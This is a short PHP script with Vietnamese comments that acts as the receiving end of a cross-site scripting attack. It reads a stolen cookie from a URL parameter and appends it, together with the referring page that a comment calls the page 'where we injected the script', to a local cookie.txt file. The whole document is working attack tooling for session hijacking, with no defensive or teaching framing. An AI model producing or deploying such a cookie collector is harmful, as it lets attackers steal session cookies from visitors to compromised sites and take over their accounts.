<?php
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    // Mở file cookie.txt, tham số a nghĩa là file này mở chỉ để write chứ không scan hay read
    $f = fopen('./cookie.txt', 'a');
    // Ta write địa chỉ trang web mà ở trang đó bị ta chèn script.
    fwrite($f, $_SERVER['http_referer'] . "\n");
    // Ghi giá trị cookie
    fwrite($f, ". Cookie la: " . $cookie . " \n");
    // Đóng file lại
    fclose($f);
}
?>